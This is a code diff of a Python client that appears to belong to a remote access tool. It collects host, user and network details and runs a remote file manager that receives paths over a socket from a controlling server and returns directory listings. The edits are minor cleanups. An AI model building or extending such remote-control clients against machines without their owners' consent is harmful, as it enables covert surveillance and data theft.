@@ -2,12 +2,11 @@ import _thread
 import os
 import platform
 import socket
-import struct
 import subprocess
 import sys
 import time
 
-import psutil
+# import psutil
 
 from socketsr import *
 
@@ -21,29 +20,35 @@ def getInfo():
     return f'systeminfo:{hostname}:{username}:{lanIp}:{system}'
 
 
-def getDiskInfo():
-    diskList = ''
-    for i in psutil.disk_partitions():
-        diskList = diskList + i.device + '-'
-
-    return diskList
+# def getDiskInfo():
+#     diskList = ''
+#     for i in psutil.disk_partitions():
+#         diskList = diskList + i.device + '-'
+#
+#     return diskList
 
 
 def fileManager(fileManagerId):
-    time.sleep(1)
     try:
         fileManagerClient = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         fileManagerClient.connect((ipaddress, port))
         data = f'fileManager:{fileManagerId}'
         # data = struct.pack('>I', len(data)) + data
-        time.sleep(1)
         # clientCmd.send(data)
         sendData(fileManagerClient, data)
+        time.sleep(1)
         while True:
             try:
                 path = receiveData(fileManagerClient)
-                if path is None:
+                if path == b'':
                     break
+
+                if path == None:
+                    continue
+
+                print(path)
+                if path == 1:
+                    continue
 
                 try:
                     dirs = os.listdir(path)
@@ -61,7 +66,6 @@ def fileManager(fileManagerId):
                 except Exception as e:
                     print(e)
                     dirData = str(e)
-
 
                 sendData(fileManagerClient, dirData)
 
